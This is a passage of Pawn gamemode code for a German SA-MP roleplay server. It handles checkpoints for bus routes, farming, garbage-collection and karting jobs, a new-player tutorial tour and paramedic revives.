    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=4;
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L1Checkpoint[playerid]==4)
    {
    if(GetVehicleModel(jobcar) == 431 || GetVehicleModel(jobcar) == 437 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
    SetPlayerCheckpoint(playerid,1600.6947,-1362.8430,15.2239,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Startower", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=5;
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L1Checkpoint[playerid]==5)
    {
    SetPlayerCheckpoint(playerid,1439.0997,-1031.3134,23.3833,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Bank Los Santos", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=6;
    }
    else if(L1Checkpoint[playerid]==6)
    {
    SetPlayerCheckpoint(playerid,1192.4468,-935.5411,42.4705,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Burger Shot North", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=7;
    }
    else if(L1Checkpoint[playerid]==7)
    {
    SetPlayerCheckpoint(playerid,794.8587,-1371.6747,13.1262,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Intercars", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=8;
    }
    else if(L1Checkpoint[playerid]==8)
    {
    SetPlayerCheckpoint(playerid,350.2134,-1647.7501,32.6868,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Angelsteg", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=9;
    }
    else if(L1Checkpoint[playerid]==9)
    {
    SetPlayerCheckpoint(playerid,1173.1632,-1825.9095,13.1255,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Busbahnhof Nord", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=10;
    }
    else if(L1Checkpoint[playerid]==10)
    {
    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast die Linie beendet und erhälst $7500 zum nächsten Payday.");
    PlayerInfo[playerid][pAccount]+=7500;
    DisablePlayerCheckpoint(playerid);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=0;
    }

	//LS Linie 2
	//BSN
    if(L2Checkpoint[playerid]==1)
    {
    if(GetVehicleModel(jobcar) == 437 || GetVehicleModel(jobcar) == 431)
    {
    SetPlayerCheckpoint(playerid,794.0136,-1350.2284,13.1138,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Market Station", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L2Checkpoint[playerid]=2;
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L2Checkpoint[playerid]==2)
    {
    if(GetVehicleModel(jobcar) == 437 || GetVehicleModel(jobcar) == 431)
    {
    SetPlayerCheckpoint(playerid,1129.1219,-1409.4923,13.1807,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: LS-Krankenhaus", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=3;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L2Checkpoint[playerid]==3)
    {
    if(GetVehicleModel(jobcar) == 437 || GetVehicleModel(jobcar) == 431)
    {
    SetPlayerCheckpoint(playerid,1146.2118,-1619.3352,13.5083,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Jobcenter", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=4;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L2Checkpoint[playerid]==4)
    {
    if(GetVehicleModel(jobcar) == 437 || GetVehicleModel(jobcar) == 431)
    {
    SetPlayerCheckpoint(playerid,1175.2574,-1855.5714,13.4916,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Altes Busdepot", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=5;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L2Checkpoint[playerid]==5)
    {
    SetPlayerCheckpoint(playerid,1481.6018,-1735.8101,13.4760,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Stadthalle", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=6;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==6)
    {
    SetPlayerCheckpoint(playerid,1817.8978,-1919.9874,13.1065,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Taxidepot", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=7;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==7)
    {
    SetPlayerCheckpoint(playerid,1983.5197,-2170.0059,13.1067,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: LS-Flughafen", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=8;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==8)
    {
    SetPlayerCheckpoint(playerid,2253.0396,-2224.6731,13.0342,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Waffenfabrik", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=9;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==9)
    {
    SetPlayerCheckpoint(playerid,1431.9406,-2286.9824,13.1099,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: LS Flughafen Ostseite", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=10;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==10)
    {
    SetPlayerCheckpoint(playerid,1431.8497,-939.5906,35.8273,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: LS Autobahnkreuz", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=11;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==11)
    {
    SetPlayerCheckpoint(playerid,1181.5731,-936.9670,42.8555,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: BSN", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    L2Checkpoint[playerid]=12;
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    }
    else if(L2Checkpoint[playerid]==12)
    {
    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Sie haben diese Linie beendet und erhälst $7000.");
    ProxDetector(5.0, playerid, "Endstelle. Wir bitten alle Fahrgäste auszusteigen.", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    PlayerInfo[playerid][pAccount]+=7000;
    DisablePlayerCheckpoint(playerid);
    L2Checkpoint[playerid]=0;
    }




// new jobcar = GetPlayerVehicleID(playerid);
//	DisablePlayerCheckpoint(playerid);
	new string[128];
	new name[MAX_PLAYER_NAME];
	new vehicle = GetPlayerVehicleID(playerid);
 	if(AktuellerCP[playerid] != INVALID_FARMER_CP && FarmerFahrzeug(vehicle))
 	{
     	if(AktuellerCP[playerid] == EndFarmerCP)
     	{
        	DisablePlayerCheckpoint(playerid);
        	AktuellerCP[playerid] = INVALID_FARMER_CP;
        	GivePlayerMoneySave(playerid,10000);
        	SendClientMessage(playerid,COLOR_LIGHTBLUE, "*Du hast das Feld geerntet und 10000$ bekommen.");
        	SendClientMessage(playerid,COLOR_LIGHTBLUE, "*In frühestens 30 Minuten sind die Felder wieder gewachsen.");
        	PlayerInfo[playerid][pFarmTime] = 1800;
        	SetVehicleToRespawn(vehicle);
			FarmerDrogen += 60;
      	}
      	else
	  	{
	  		AktuellerCP[playerid]++;
		  	SetPlayerCheckpoint(playerid,FarmerCPS[AktuellerCP[playerid]][0],FarmerCPS[AktuellerCP[playerid]][1],FarmerCPS[AktuellerCP[playerid]][2],  8.0);
  		}
	}
	if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
	{
	    TaxiAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Ziel Erreicht", 5000, 1);
		TaxiCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(Navi[playerid] == 1)
	{
	    GameTextForPlayer(playerid, "~w~Ziel erreicht", 5000, 1);
	    Navi[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	}
	else if(BusCallTime[playerid] > 0 && BusAccepted[playerid] < 999)
	{
	    BusAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Ziel Erreicht", 5000, 1);
		BusCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(CP[playerid] == 9)//Karting
	{
		GameTextForPlayer(playerid, "~r~Warte hier auf mehr Kartfahrer", 4000, 3);
		DisablePlayerCheckpoint(playerid);
	}
	else if(CP[playerid] == 10) { CP[playerid] = 11; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2258.7874,-2402.9712,12.7035,8.0); }
	else if(CP[playerid] == 11) { CP[playerid] = 12; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2225.8755,-2461.3875,12.7190,8.0); }
	else if(CP[playerid] == 12) { CP[playerid] = 13; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2276.9983,-2662.8328,12.8580,8.0); }
	else if(CP[playerid] == 13) { CP[playerid] = 14; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2449.1399,-2663.0562,12.8138,8.0); }
	else if(CP[playerid] == 14) { CP[playerid] = 15; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2566.9814,-2504.5686,12.7692,8.0); }
	else if(CP[playerid] == 15) { CP[playerid] = 16; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2719.0520,-2503.5962,12.7706,8.0); }
	else if(CP[playerid] == 16) { CP[playerid] = 17; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2720.7881,-2405.6589,12.7441,8.0); }
	else if(CP[playerid] == 17) { CP[playerid] = 18; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2571.5195,-2401.1531,12.7528,8.0); }
	else if(CP[playerid] == 18) { CP[playerid] = 19; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2406.6995,-2423.1182,12.6641,8.0); }
	else if(CP[playerid] == 19) { CP[playerid] = 20; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2322.9194,-2341.5715,12.6664,8.0); }
	else if(CP[playerid] == 20)//End of Karting
	{
	    CP[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	    GetPlayerName(playerid, name, sizeof(name));
	    if(FirstKartWinner == 999)
	    {
	        FirstKartWinner = playerid;
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
		            if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
		            {
		                format(string, sizeof(string), "* %s wurde 1. im Kartrennen.",name);
		                SendClientMessage(i, COLOR_WHITE, string);
		            }
				}
			}
	    }
	    else if(SecondKartWinner == 999)
	    {
	        SecondKartWinner = playerid;
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
		            if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
		            {
		                format(string, sizeof(string), "* %s wurde 2. im Kartrennen.",name);
		                SendClientMessage(i, COLOR_WHITE, string);
		            }
				}
			}
	    }
	    else if(ThirdKartWinner == 999)
	    {
	        ThirdKartWinner = playerid;
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
		            if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
		            {
		                format(string, sizeof(string), "* %s wurde 2. im Kartrennen.",name);
		                SendClientMessage(i, COLOR_WHITE, string);
		                SendClientMessage(i, COLOR_WHITE, "** Kartrennen zu Ende **");
		                CP[i] = 0;
		                DisablePlayerCheckpoint(i);
		            }
				}
	        }
	    }
	}
	else
	{
		switch (gPlayerCheckpointStatus[playerid])
		{
			case CHECKPOINT_HOME:
		    {
				PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				DisablePlayerCheckpoint(playerid);
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
				GameTextForPlayer(playerid, "~w~Du bist zu Hause", 5000, 1);
		    }
		}
	}


	new trinkgeld = 800; // Geld / Checkpoint

	if(MullabfuhrCP[playerid] == 1 && IsPlayerInRangeOfPoint(playerid,10.0,1355.6742,-1749.4160,13.3807))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid,1539.8971,-1628.5874,13.38287, 5.0);
	    MullabfuhrCP[playerid] = 2;
	}
	else if(MullabfuhrCP[playerid] == 2 && IsPlayerInRangeOfPoint(playerid,10.0,1539.8971,-1628.5874,13.3828))
	{
	   	GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 1334.5597,-1092.3732,24.9917, 5.0);
	    MullabfuhrCP[playerid] = 3;
	}
	else if(MullabfuhrCP[playerid] == 3 && IsPlayerInRangeOfPoint(playerid,10.0,1334.5597,-1092.3732,24.9917))
	{
   	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 1316.0133,-902.1998,39.4142, 5.0);
	    MullabfuhrCP[playerid] = 4;
	}
	else if(MullabfuhrCP[playerid] == 4 && IsPlayerInRangeOfPoint(playerid,10.0,1316.0133,-902.1998,39.4142))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 832.4395,-864.8736,69.2248, 5.0);
	    MullabfuhrCP[playerid] = 5;
	}
	else if(MullabfuhrCP[playerid] == 5 && IsPlayerInRangeOfPoint(playerid,10.0,832.4395,-864.8736,69.2248))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 332.3819,-1186.4304,76.3311, 5.0);
	    MullabfuhrCP[playerid] = 6;
	}
	else if(MullabfuhrCP[playerid] == 6 && IsPlayerInRangeOfPoint(playerid,10.0,332.3819,-1186.4304,76.3311))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 369.8034,-2047.2219,7.8359, 5.0);
	    MullabfuhrCP[playerid] = 7;
	}
	else if(MullabfuhrCP[playerid] == 7 && IsPlayerInRangeOfPoint(playerid,10.0,369.8034,-2047.2219,7.8359))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 920.3291,-1795.6578,13.5469, 5.0);
	    MullabfuhrCP[playerid] = 8;
	}
	else if(MullabfuhrCP[playerid] == 8 && IsPlayerInRangeOfPoint(playerid,10.0,920.3291,-1795.6578,13.5469))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid, 1085.8635,-1837.6129,13.5716, 5.0);
	    MullabfuhrCP[playerid] = 9;
	}
	else if(MullabfuhrCP[playerid] == 9 && IsPlayerInRangeOfPoint(playerid,10.0,1085.8635,-1837.6129,13.5716))
	{
	    GivePlayerMoneySave(playerid, trinkgeld);
	    format(string, sizeof(string), "** Du hast den Müll aufgeladen und %d$ erhalten, fahr zum Nächsten Checkpoint.",trinkgeld);
	    SendClientMessage(playerid, COLOR_GREEN, string);
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid,1215.9088,-1833.6079,13.3941,5.0);
		MullabfuhrCP[playerid] = 10;
	}
	else if(MullabfuhrCP[playerid] == 10 && IsPlayerInRangeOfPoint(playerid,10.0,1215.9088,-1833.6079,13.3941))
	{
	    SendClientMessage(playerid, COLOR_RED, "Das wars, dein Fahrzeug wurde vom Mitarbeiter geparkt, den Rest übernehmen die anderen Mitarbeiter!");
        DisablePlayerCheckpoint(playerid);
        GivePlayerMoneySave(playerid, 5000);
        SendClientMessage(playerid, COLOR_RED, "Du bekommst einen kleinen Bonus von 5.000$");
        SendClientMessage(playerid, COLOR_RED, "In 30 Minuten kannst du wieder eine Runde fahren.");
        new car;
		car = GetPlayerVehicleID(playerid);
  	    SetVehicleToRespawn(car);
        Mullabfuhr[playerid] = 0;
        MullabfuhrCP[playerid] = 0;
	    PlayerInfo[playerid][pMulltime] = 1800;
 	}

 	if(TutStep[playerid] == 1 && IsPlayerInRangeOfPoint(playerid,10.0,1481.0176,-1769.5886,18.7958))  // Stadthalle Davor
 	{
 	    DisablePlayerCheckpoint(playerid);
 	    ClearChatbox(playerid,20);
        SetPlayerCheckpoint(playerid,362.7874,173.8484,1008.3828,8.0); // Stadthalle /stadthalle
        TutStep[playerid] = 2;

 	}
 	if(TutStep[playerid] == 2 && IsPlayerInRangeOfPoint(playerid,10.0,362.7874,173.8484,1008.3828)) // Stadthalle /stadthalle
 	{
 	    DisablePlayerCheckpoint(playerid);
 	    ClearChatbox(playerid,20);
 	    SCM(playerid,COLOR_LIGHTBLUE,"In der Stadthalle kannst du unter anderem einen Job annehmen, eine Organisation gründen oder Fähigkeiten für deine Organisation Freischalten!");
        SCM(playerid,COLOR_LIGHTBLUE,"Oft steht die Stadthalle im Zentrum des Servers.");
        SCM(playerid,COLOR_LIGHTBLUE,"* Bitte verlasse nun die Stadthalle und steige wieder in dein Fahrzeug.");
        SetPlayerCheckpoint(playerid,1535.9557,-1672.6881,13.0856,8.0); // LSPD

        TutStep[playerid] = 3;

	}
 	if(TutStep[playerid] == 3 && IsPlayerInRangeOfPoint(playerid,10.0,1535.9557,-1672.6881,13.0856)) // LSPD
 	{
 	    DisablePlayerCheckpoint(playerid);
 	   	ClearChatbox(playerid,20);
 	    DisablePlayerCheckpoint(playerid);
 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier befindet sich das Gebäude der Polzei und die Einsatzzentrale.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Wenn du ein Verbrechen begehst, dürfen Sie dich auch mit Gewalt festnehmen.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Auf unserem Server herrscht keine Bewerbungspflicht.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst per /leader die Nummern der verschiedenen Fraktionsleadern herausfinden und sie Kontaktieren.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Sobald du Level 3 erreicht hast kannst du einer Fraktion beitreten. Nach dem Tutorial wird dies als auswahl für den Startbonus hinzugefügt.");
 	    SetPlayerCheckpoint(playerid,771.7474,-1345.2732,13.5253,8.0); // Mittelklasse Autos
 	    TutStep[playerid] = 4;

 	}
 	if(TutStep[playerid] == 4 && IsPlayerInRangeOfPoint(playerid,10.0,771.7474,-1345.2732,13.5253))
 	{
 	    ClearChatbox(playerid,20);
 	    DisablePlayerCheckpoint(playerid);
 	    ClearChatbox(playerid,20);
 	    DisablePlayerCheckpoint(playerid);
 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier kannst du dir Autos der Mittelklasse kaufen.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Du besitzt bereits ein Auto, im laufe der Zeit kannst du dir aber hier neue kaufen.");

 	    SetPlayerCheckpoint(playerid,790.8717,-1278.8928,13.5469,8.0); // fahrschule
 	    TutStep[playerid] = 5;


	}
 	if(TutStep[playerid] == 5 && IsPlayerInRangeOfPoint(playerid,10.0,790.8717,-1278.8928,13.5469)) // fahrschule
 	{
 	    ClearChatbox(playerid,20);
 	    DisablePlayerCheckpoint(playerid);
 	    SCM(playerid,COLOR_LIGHTBLUE,"Das hier ist die Fahrschule.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst hier alle möglichen Scheine machen.");

 	    SetPlayerCheckpoint(playerid,1969.5035,-2203.6216,13.5469,8.0); // Flughafen
 	    TutStep[playerid] = 6;
 	}
 	if(TutStep[playerid] == 6 && IsPlayerInRangeOfPoint(playerid,10.0,1969.5035,-2203.6216,13.5469))
 	{
 	    ClearChatbox(playerid,20);
 	    DisablePlayerCheckpoint(playerid);
 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier am Flugplatz von Los Santos fliegen viele Hobby oder Job Pilotenflieger ein.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst dir hier verschiedene Flugfahrzeuge kaufen.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Unter anderem kannst du für ein kleines Entgeld Fallschirm Springen!");

 	    SetPlayerCheckpoint(playerid,1809.0544,-2428.0852,13.2414,8.0); // Tanke
 	    TutStep[playerid] = 7;
 	}
 	if(TutStep[playerid] == 7 && IsPlayerInRangeOfPoint(playerid,10.0,1809.0544,-2428.0852,13.2414))
 	{
 	    ClearChatbox(playerid,20);
 	    SCM(playerid,COLOR_LIGHTBLUE,"Das hier ein ein Biz / Geschäft.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Es gibt sie in den verschiedensten Formen in San Andreas.");
 	    SCM(playerid,COLOR_LIGHTBLUE,"Wenn du etwas mehr Geld investierst kannst du dir selber ein lukratives Geschäft aufbauen.");
 	    TutStep[playerid] = 8;

 	}

 	// Sanitöter
 	if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4 && JobDuty[playerid] == 1)
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i) && PlayerInfo[i][pTot] == 1 && IsPlayerInRangeOfPoint(playerid,5.0,PlayerInfo[i][pPos_x],PlayerInfo[i][pPos_y],PlayerInfo[i][pPos_z]))
					{
						new pname[256];
						GetPlayerName(i, pname, 256);
                        PlayerInfo[playerid][pSpielerWiederbelebt]++;
						GameTextForPlayer(playerid, "2500$ erhalten", 2000, 1);
						format(string, 256, "** Du hast %s wiederbelebt, das war deine %d Wiederbelebung **",pname,PlayerInfo[playerid][pSpielerWiederbelebt]);
						SendClientMessage(playerid, COLOR_ALLDEPT, string);
						GetPlayerName(playerid, pname, 256);
						format(string, 256, "** Sanitäter %s hat dich wiederbelebt **",pname);
						SendClientMessage(i, COLOR_ALLDEPT, string);
						//GivePlayerMoneySave(playerid, 2500);
						PlayerInfo[i][pTot] = 0;
                        PlayerInfo[i][pTotTime] = 0;

						SetCameraBehindPlayer(i);
					//	Delete3DTextLabel(DeathText[i]);

						RemoveIcon(i);
					//	DestroyPickup(TotenKopf[i]);


//						DestroyPickup(TotenKopf[i]);
                        UnFreezePlayer(i);
						PlayerInfo[i][pTx] = 0.0;
						PlayerInfo[i][pTy] = 0.0;
						PlayerInfo[i][pTz] = 0.0;
						SetPlayerSpawn(i);
						DisablePlayerCheckpoint(playerid);
						PlayerInfo[playerid][pGehalt]+=500;
						GameTextForPlayer(playerid, "~w~Spieler geheilt\nDu erhaelst ~g~$500", 4000, 1);
					}
				}
			}


 	//
	return 1;
}

//1535.9557,-1672.6881,13.0856


Function OnPlayerLeaveCheckpoint(playerid)
{
	if(TutStep[playerid] == 8)
	{
	    DisablePlayerCheckpoint(playerid);
	    ClearChatbox(playerid,10);

	    SCM(playerid,COLOR_GRAD1,"-------------------------------------------------------------");

	    SCM(playerid,COLOR_GRAD1,"Du bist nun am Ende des Tutorials angekommen");

	    SCM(playerid,COLOR_GRAD1,"Alle Funktionen auf dem Server wurden nur für dich Freigeschaltet.");

	   	ClearChatbox(playerid,2);

	    SCM(playerid,COLOR_GRAD1,"** Letzte Tipps **");

	    SCM(playerid,COLOR_GRAD1,"Du kannst jetzt mit /startbonus deinen Startbonus abholen.");

	    SCM(playerid,COLOR_GRAD1,"Da du jetzt Level 3 bist kannst du dich nach einer Fraktion umschauen.");

	    SCM(playerid,COLOR_GRAD1,"Das Adminteam empfiehlt vorallem die jeweiligen Leader im Teamspeak 3 anzusprechen!");

	    SCM(playerid,COLOR_GRAD1,"**            **");
	    SCM(playerid,COLOR_GRAD1,"-------------------------------------------------------------");

     	SCM(playerid,COLOR_LIGHTBLUE,"Wir wünschen dir viel Glück und Spaß auf unserem Server!");

	    TutStep[playerid] = 0;  // abgeschlossen

	    TutorialGemacht[playerid] = 1;
	    return 1;
	}
	return 1;
}

Function OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

Function OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

Function OnRconCommand(cmd[])
{



    if(strfind(cmd, "UCP", true) != -1) strdel(cmd,0,3);
	{
